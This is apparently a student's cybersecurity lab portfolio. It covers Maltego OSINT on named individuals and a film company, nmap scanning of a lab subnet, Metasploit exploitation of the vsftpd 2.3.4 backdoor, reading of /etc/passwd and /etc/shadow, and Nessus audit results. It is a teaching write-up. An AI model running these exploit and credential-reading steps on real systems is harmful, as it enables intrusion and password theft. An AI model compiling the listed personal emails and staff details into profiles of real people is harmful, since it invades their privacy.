# Cybersecurity Lab Portfolio - Complete Edition

**Portfolio Date**: May 2026 | **Author**: PilauGrice | **Last Updated**: 2026-05-25

---

## Table of Contents

1. [Overview](#overview)
2. [Unit 2: Footprinting & Passive Reconnaissance (OSINT)](#unit-2-footprinting--passive-reconnaissance-osint)
3. [Unit 3: Active Reconnaissance & Local Subnet Diagnostics](#unit-3-active-reconnaissance--local-subnet-diagnostics)
4. [Unit 4: Controlled Exploitation & Automated Auditing](#unit-4-controlled-exploitation--automated-auditing)
5. [Formal Laboratory Question Responses](#formal-laboratory-question-responses)

---

## Overview

This portfolio documents a comprehensive cybersecurity laboratory focused on open-source threat intelligence (OSINT), passive reconnaissance, active reconnaissance, and controlled exploitation techniques.

### Learning Objectives

- Master OSINT methodologies using automated node graph linkages (Maltego)
- Execute CLI-based DNS and network registry lookups
- Conduct subnet diagnostics and active reconnaissance
- Perform controlled vulnerability exploitation and post-exploitation analysis
- Execute automated vulnerability auditing with enterprise-grade tools

### Key Technologies

- **Reconnaissance**: Maltego, whois, dig, nmap
- **Exploitation**: Metasploit Framework, Nessus
- **Target Platforms**: Kali Linux, Ubuntu, Metasploitable
- **Analysis**: CVSS/CVE frameworks, vulnerability scoring

---

# Unit 2: Footprinting & Passive Reconnaissance (OSINT)

## Overview

This module evaluates open-source threat intelligence data compilation using automated node graph linkages (Maltego) and low-level CLI lookup systems targeting public DNS and network registries.

---

## Exercise 2.1: Package Architecture Setup & Registry Troubleshooting

### Problem Statement

During initial deployment of Maltego on the Kali Linux platform, an upstream signature error was flagged by the Advanced Package Tool due to a missing repository cryptographic token key: `ED65462EC8D5E4C5`

### Solution

The security blockage was remediated by manually injecting the certified 2025 Kali keyserver token using an advanced keyserver request string:

```bash
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
```

### Key Milestones

1. **APT Package Manager Keyring Error Verification** *(Screenshot: 2026-05-20 180258.jpg)*
   - System diagnostic logs tracking authentication blocks during repository indexing initialization

2. **Keyserver Cryptographic Token Import Validation** *(Screenshot: 2026-05-20 180737.png)*
   - Terminal stdout validating successful keyring signature injection

3. **Successful Compilation of stable maltego_4.11** *(Screenshot: 2026-05-20 180923.jpg)*
   - Package unpacking trace verifying absolute library installation parameters

4. **Java Virtual Machine Environment Runtime Verification** *(Screenshot: 2026-05-20 183420.jpg)*
   - Console trace verifying active memory heap configuration boundaries at `/usr/lib/jvm/java-11-openjdk-amd64`

---

## Exercise 2.2: Maltego Open-Source Transform Analytics

### Target: Clotet / Funicular Films

A multi-tier open intelligence exploration loop was targeted at personal identifiers (Aina Clotet, Marc Clotet) to expand initial names into corporate entities and infrastructure assets.

### Intelligence Gathering Pipeline

#### Phase 1: Initial Name Phrase Configuration
- **Screenshot: 2026-05-20 190853.jpg** - Tracking baseline website naming configurations and public text hits

#### Phase 2: Hierarchical Entity Mapping
- **Screenshot: 2026-05-20 192449.jpg** - Sorting primary links into a structured organizational parent framework tree

#### Phase 3: Cross-Reference Mapping
- **Screenshot: 2026-05-20 193625.jpg** - Identifying media and public news asset anchors linked to core target profiles

#### Phase 4: Relationship Interconnection
- **Screenshot: 2026-05-20 193916.jpg** - Tracking shared infrastructure links bridging distinct entity groups

#### Phase 5: Master Structural Verification
- **Screenshot: 2026-05-20 194016.jpg** - Full-canvas layout tracking complete threat mapping without direct server interaction

### High-Value Intelligence Extractions

#### Domain & Email Harvesting
- **Screenshot: 2026-05-20 194951.jpg** - High-Value Apex Domain Extraction Pass
  - Communication channels: `esther@paperstreet.es`, `aina@funicularfilms.com`
  - Core destination links: `www.marc-clotet.com`

#### URL Parsing & Schema Resolution
- **Screenshot: 2026-05-20 195129.jpg** - Programmatically transforming plain text elements into distinct web schema properties

#### Target Scope Boundary Locking
- **Screenshot: 2026-05-20 195353.png** - Macro-zoom validation confirming strict target focus parameters

### Social Engineering Surface Mapping
- **Screenshot: 2026-05-20 200019.jpg** - Extracting public personnel account schemas: `mo@un.com`, `t@ru.com`

### External Relationship Dependencies
- **Screenshot: 2026-05-20 200320.jpg** - Tracing external links referencing third-party production nodes (`www.formulatv.com`)

### Geographic & Infrastructure Intelligence
- **Screenshot: 2026-05-20 201446.jpg** - Harvesting regional infrastructure endpoints: Spanish telecommunication markers (`+34 91...`)

### Historical Timeline Analysis
- **Screenshot: 2026-05-20 201510.jpg** - Scraping archive snapshots from 2008 to 2014 to isolate legacy directory structures

### Final Intelligence Canvas
- **Screenshot: 2026-05-20 201630.jpg** - Completed multi-target decade-scale OSINT canvas covering ten years of data transitions

### Inbound Web Entity Mapping (Funicular Films)
- **Screenshot: 2026-05-20 202149.jpg** - Mapping core external dependencies: `wikipedia.org`, `variety.com`, `linkedin.com`
- **Screenshot: 2026-05-20 203338.png** - Separating core routes into Home and About Us metadata blocks
- **Screenshot: 2026-05-20 203528.jpg** - Final corporate mapping tracking stakeholders: Marc Clotet, Aina Clotet, Marta Baldo, Jan Andreu; Regional offices: Barcelona, Sweden

---

## Exercise 2.3: Pure Command-Line Terminal Reconnaissance

To validate Maltego's automated outputs, low-level shell diagnostics were executed against `hackthissite.org` using standard query utilities.

### WHOIS Domain Registration Analysis

```bash
whois hackthissite.org
```

**Results** *(Screenshot: 2026-05-20 211734.jpg)*
- Domain creation index: 2003
- Primary DNS routing arrays: Porkbun / buddyns

### DNS Zone Resolution

```bash
dig hackthissite.org
```

**Results** *(Screenshot: 2026-05-20 211840.png)*
- Perimeter load-balancing arrays: `137.74.187.100` through `137.74.187.104`

### RIR Netblock Allocation

```bash
whois 137.74.187.100
```

**Results** *(Screenshot: 2026-05-20 212100.jpg)*
- RIPE NCC allocated `/16` network notation: `137.74.0.0/16`

### Upstream Service Provider Architecture

**Results** *(Screenshot: 2026-05-20 212244.jpg)*
- Physical hosting footprint: OVH facility block in Berlin, Germany (DE)

---

# Unit 3: Active Reconnaissance & Local Subnet Diagnostics

## Overview

This phase covers setting up local testing infrastructure, profiling sandboxed machines, and testing low-level link parameters.

---

## Exercise 3.1: Machine Baseline Profiling

To ensure testing environment compatibility, kernel releases and build structures were collected across active hosts using `hostname`, `uname -a`, and release scripts.

### Ubuntu Gateway Interface Profile

```bash
uname -a
```

**Results** *(Screenshot: 2026-05-20 213617.jpg)*
- **OS**: Ubuntu 26.04 LTS (Resolute Raccoon)
- **Kernel**: Linux 7.0.0-14 generic kernel structure

### Local Attacker Platform (Kali Linux)

```bash
uname -a
```

**Results** *(Screenshot: 2026-05-20 213659.png)*
- **OS**: Rolling Kali Linux build
- **Base**: Debian 5.16.0 framework

### Legacy Threat Target (Metasploitable)

```bash
uname -a
```

**Results** *(Screenshot: 2026-05-20 213843.png)*
- **OS**: End-of-life Ubuntu 8.04 (Hardy)
- **Kernel**: Outdated 32-bit Linux 2.6.24-16 server structure

### Bypass for Legacy Systems

```bash
cat /etc/lsb-release
```

**Results** *(Screenshot: 2026-05-20 213952.png)*
- Successfully identifies OS despite system faults
- Confirms end-of-life Ubuntu 8.04 (Hardy) distribution

---

## Exercise 3.2: Subnet Interface Mapping Matrix

### Challenge: Modern System Deprecations

Modern system distributions deprecate `net-tools` configurations by default, causing standard `ifconfig` strings to return faults.

```bash
ifconfig
# System path shell error during interface query execution
```

### Dependency Resolution

```bash
sudo apt install net-tools
```

### Complete Lab Network Topology

**Network Segment**: `192.168.122.0/24` with netmask `255.255.255.0`

#### Ubuntu Gateway (Layer-3 Configuration)
```bash
ifconfig ens4
```
- **Interface**: ens4
- **IP Address**: 192.168.122.71
- **Role**: Default gateway for test segment

#### Kali Attacker Platform (Layer-3 Configuration)
```bash
ifconfig eth0
```
- **Interface**: eth0
- **IP Address**: 192.168.122.148
- **Role**: Penetration testing workstation

#### Metasploitable Target (Layer-3 Configuration)
```bash
ifconfig eth0
```
- **Interface**: eth0
- **IP Address**: 192.168.122.108
- **Role**: Vulnerable test target

### Network Topology Summary

```
┌──────────────────────────────────────┐
│   192.168.122.0/24 Lab Network       │
├──────────────────────────────────────┤
│ Gateway:        192.168.122.71       │
│ Attacker:       192.168.122.148      │
│ Target:         192.168.122.108      │
└──────────────────────────────────────┘
```

---

## Exercise 3.3: Link MTU Sizing and Packet Fragmentation Verification

### Test Command

```bash
ping -M do -s 1472 192.168.122.108
```

### Payload Calculation

| Component | Size |
|-----------|------|
| ICMP Payload | 1472 bytes |
| IP Header | 20 bytes |
| ICMP Header | 8 bytes |
| **Total Frame** | **1500 bytes** |

### Results

- **MTU Limit**: 1500-byte frame confirmed
- **Packet Loss**: 0% (no fragmentation required)
- **Interpretation**: Standard Ethernet MTU with no issues

---

## Exercise 3.4: Port Scanning, Banner Grabbing & Active Interrogation

### Nmap Stealth SYN Port Sweep

```bash
sudo nmap -sS -Pn 192.168.122.108
```

**Results** *(Screenshot: 2026-05-20 214530.jpg)*
- **Open Ports**: 23 discovered
- Notable Services:
  - Port 21: FTP
  - Port 23: Telnet
  - Port 1524: ingreslock
  - Port 6667: IRC
  - Port 5900: VNC

### Manual Socket Banner-Grabbing

```bash
nc -nv 192.168.122.108 21
```

**Technique**: Force clear-text application identification banners directly from raw socket

### Automated Version Signature Fingerprinting

```bash
sudo nmap -sV -p 21 192.168.122.108
```

**Results** *(Screenshot: 2026-05-20 214948.jpg)*
- **Service**: vsftpd (Very Secure FTP Daemon)
- **Version**: 2.3.4
- **Vulnerability Status**: Known to contain supply-chain compromise backdoor

---

# Unit 4: Controlled Exploitation, Post-Exploitation & Automated Auditing

## Overview

This phase documents targeted vulnerability verification through system exploitation and automated enterprise compliance mapping.

---

## Exercise 4.1: Weaponized Framework Staging & Privileged System Extraction

### Supply-Chain Compromise Context

In July 2011, the master source archive for vsftpd 2.3.4 was altered to include a malicious command delivery mechanism. When an authentication attempt passes specific parameter characters containing a smiley face (`':)'`), the daemon instantly forks process execution and opens an unauthenticated listening shell on **Port 6200** with complete root administrative privileges.

### Exploitation Workflow

#### Stage 1: Module Configuration

```
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set rhosts 192.168.122.108
```

#### Stage 2: Parameter Verification

```
msf> show options
```

#### Stage 3: Exploit Injection & Shell Extraction

```
msf> exploit
```

**Results**:
- Triggering the system backdoor on Port 6200
- Establishing interactive shell with remote system

```bash
shell> whoami
root
shell> hostname
target
```

### Post-Exploitation Data Exfiltration

#### System Account Database Extraction

```bash
cat /etc/passwd
```

**Extracted Users**: msfadmin, postgres, tomcat55, and others

#### Cryptographic Hash Database Extraction

```bash
cat /etc/shadow
```

**Critical Finding**: Successfully lifted protected local administrative **password hashes**

### Session Stability & Verification

#### Multi-Command Access Continuity

```bash
whoami && hostname
```

#### Network Routing Verification

```bash
ping 192.168.122.71
```

---

## Exercise 4.2: Automated Vulnerability Auditing (Tenable Nessus)

### Installation & Integrity Verification

```bash
sudo dpkg -i Nessus.deb
```

**Cryptographic Integrity Checks**:
- OpenSSL FIPS Known-Answer Tests
- AES, SHA, and RSA components

### Web Administration Interface Setup

```
https://192.168.122.148:8834/
```

### Scanner Configuration & Scope Definition

```
Target: 192.168.122.108
```

### Vulnerability Assessment Results

**Prioritized Vulnerabilities**:

| Vulnerability | CVSS Score | Status |
|---|---|---|
| UnrealIRCd | 10.0 (Critical) | Verified |
| VNC Default Password | 10.0 (Critical) | Verified |
| Samba Badlock | 7.5 (High) | Verified |

---

## Comparative Analysis Matrix: Scanning Policy Trade-offs

### Common Ports Policy Results

| Metric | Value |
|--------|-------|
| Duration | 13 minutes 4 seconds |
| Total Vulnerabilities | 70 |
| Critical | 10 |
| High | 6 |
| Medium | 25 |
| Low | 9 |

### All Ports Policy Results

| Metric | Value | Change |
|--------|-------|--------|
| Duration | 17 minutes 41 seconds | +35.4% |
| Total Vulnerabilities | 71 | +1 |
| Critical | 11 | +1 |
| High | 6 | — |
| Medium | 26 | +1 |
| Low | 9 | — |

### Trade-Off Analysis

- Expanding scan scope to all 65,535 ports increased processing duration by **35.4%**
- Successfully uncovered **1 additional Critical vulnerability**
- Total threat footprint raised from **70 to 71 vulnerabilities**

---

# Formal Laboratory Question Responses

## Part C: Framework Definitions & Analysis

---

## 1. Core Framework Definitions & Vulnerability Management Risk Priorities

### Question: What is CVE and its importance in vulnerability management?

**Answer**

CVE (Common Vulnerabilities and Exposures) acts as a standardized data dictionary that assigns unique tracking identifiers (e.g., CVE-2011-2523) to publicly disclosed security flaws.

**Key Functions**:
- Provides universal naming convention across independent security tools
- Enables consistency in vendor advisors and remediation logs
- Facilitates tracking, discussion, and remediation of technical vulnerabilities
- Eliminates translation ambiguities across diverse software platforms

**Importance in Vulnerability Management**:
1. **Standardization**: Security teams can reference flaws using identical identifiers
2. **Communication**: Enables precise discussion across departments
3. **Automation**: Allows automated scanning tools to correlate findings
4. **Tracking**: Enables longitudinal monitoring across asset inventory
5. **Compliance**: Required for audit trails and regulatory reporting (PCI-DSS, SOC 2)

---

### Question: What is CVSS and its importance in vulnerability management?

**Answer**

CVSS (Common Vulnerability Scoring System) is an open framework that generates a quantitative numerical severity score ranging from **0.0 to 10.0** based on a vulnerability's technical characteristics.

**Scoring Criteria**:
- Attack vector constraints
- Authentication requirements
- Data confidentiality impacts
- Data integrity impacts
- Availability impacts

**CVSS Score Tiers**:

| Score Range | Severity | Priority |
|---|---|---|
| 9.0-10.0 | Critical | Patch immediately |
| 7.0-8.9 | High | Patch within 1-2 weeks |
| 4.0-6.9 | Medium | Patch within 30 days |
| 0.1-3.9 | Low | Patch during regular cycle |

**Importance**:
1. **Risk Prioritization**: Allocates resources to highest-impact flaws
2. **Enterprise Optimization**: Enables patch management across hundreds of assets
3. **Business Justification**: Provides data-driven rationale for timelines
4. **Compliance**: Satisfies regulatory requirements
5. **Quantification**: Converts subjective risk into objective metrics

---

## 2. Post-Exploitation Technical Analysis & Privilege Verification

### Question: Why was the FTP version important in this exercise?

**Answer**

The specific application version banner (`vsftpd 2.3.4`) was critical because it is **directly tied to a documented supply-chain compromise event**.

**Supply-Chain Compromise Details**:
- **Date**: July 2011
- **Target**: vsftpd 2.3.4 source code repository
- **Modification**: Master source archive was altered to include malicious command delivery mechanism
- **Trigger Mechanism**: Smiley face character pattern (`':)'`) in authentication attempt

**Exploitation Flow**:
```
1. Attacker connects to FTP server
2. Sends login with parameter containing ':)'
3. vsftpd daemon detects trigger pattern
4. Daemon forks process
5. Opens unauthenticated shell on Port 6200
6. Shell executes with ROOT PRIVILEGES
```

**Importance in Vulnerability Management**:
1. Version fingerprinting enables automated exploit selection
2. Specific version numbers map to specific vulnerability signatures
3. Nmap can rapidly identify exploitable systems across networks
4. Allows prioritization of remediation

---

### Question: What is the difference between /etc/passwd and /etc/shadow?

**Answer**

#### /etc/passwd (Global Readable)

**Access Level**: Readable by all users on system

**Contents**:
- Username
- User ID (UID) mappings
- Group ID (GID) assignments
- Home directory paths
- Default shell binaries

**File Structure Example**:
```
root:x:0:0:root:/root:/bin/bash
msfadmin:x:1000:1000:MSF Admin:/home/msfadmin:/bin/bash
```

#### /etc/shadow (Root-Only)

**Access Level**: Readable ONLY by root accounts (chmod 600)

**Contents**:
- Username
- **Cryptographic salted password hashes**
- Password expiration timestamps
- Account lockout flags
- Security settings

#### Key Differences

| Aspect | /etc/passwd | /etc/shadow |
|--------|---|---|
| **Permissions** | World-readable (644) | Root-only (600) |
| **Contains Passwords** | No | Yes (hashed) |
| **Application Access** | Standard processes | Only privileged daemons |
| **Compromise Risk** | Low | **HIGH** |

---

### Question: What does access to these files suggest about the risk posed by this vulnerability?

**Answer**

**Assessment**: Successful extraction of both `/etc/passwd` and `/etc/shadow` files demonstrates **ABSOLUTE SYSTEM COMPROMISE** with maximum criticality.

#### Threat Model Analysis

**Access Level Achieved**:
- Read access to `/etc/shadow` indicates bypass of **ALL operating system security boundaries**
- Indicates attacker has obtained **administrative root control**
- Proves vulnerability enables complete privilege escalation

#### Immediate Threats

**1. Confidentiality Breach**
- All user account metadata exposed
- Email addresses, home directories, shell access patterns revealed
- Full system user enumeration for targeted attack planning

**2. Authentication Compromise**
- Password hashes extracted for offline brute-force cracking
- Tools like **John the Ripper** enable rapid hash cracking
- Weak passwords compromise additional accounts

**3. Lateral Movement**
- Compromised host access to connected enterprise subnets
- Cracked credentials enable pivot to other systems
- Network trust relationships can be exploited

**4. Data Theft**
- Access to application databases
- Customer data, intellectual property exposure
- Regulatory violation (GDPR, HIPAA, PCI-DSS)

**5. System Persistence**
- Ability to install rootkits
- Creation of hidden backdoor accounts
- Long-term system control

#### Required Response

**Immediate Actions** (within 1 hour):
1. ✓ Isolate affected system from network
2. ✓ Preserve forensic evidence (disk image)
3. ✓ Alert security incident response team
4. ✓ Initiate breach notification procedures

**Short-term** (within 24 hours):
1. ✓ Conduct full forensic analysis
2. ✓ Reset all passwords across enterprise
3. ✓ Audit account access logs
4. ✓ Scan other systems for infection

**Long-term** (within 1 week):
1. ✓ Rebuild system from clean media
2. ✓ Apply all security patches
3. ✓ Implement network segmentation
4. ✓ Deploy intrusion detection systems

#### Risk Rating: **CRITICAL (10.0)**

This vulnerability allows:
- ✓ Unauthenticated remote code execution
- ✓ Immediate root privilege escalation
- ✓ Complete system compromise
- ✓ Credential harvesting for lateral movement
- ✓ Full data access and exfiltration capability

---

## Summary of Laboratory Findings

### Vulnerability Chain Demonstrated

```
Passive OSINT
    ↓
Active Reconnaissance
    ↓
Service Enumeration (vsftpd 2.3.4)
    ↓
Exploit Selection (supply-chain backdoor)
    ↓
Root Access (Port 6200 shell)
    ↓
Credential Harvesting (/etc/shadow)
    ↓
Offline Hash Cracking
    ↓
Lateral Movement & Persistence
```

### Key Takeaways

✅ **Version Intelligence is Critical**: Specific version numbers enable targeted exploitation  
✅ **File Permissions Matter**: `/etc/shadow` read access = game over  
✅ **Supply-Chain Attacks are Insidious**: Legitimate software distribution can be compromised  
✅ **Defense in Depth Required**: No single control prevents exploitation  
✅ **Incident Response Planning**: Compromise detection and response must be pre-planned  

---

## Final Summary

This comprehensive cybersecurity laboratory demonstrates the complete attack lifecycle from passive reconnaissance through automated auditing. The exercises validate both manual exploitation techniques and automated vulnerability scanning, providing empirical evidence of infrastructure exposure and remediation requirements.

**Laboratory Completion Date**: May 25, 2026  
**Portfolio Version**: 1.0

---

*End of Document*
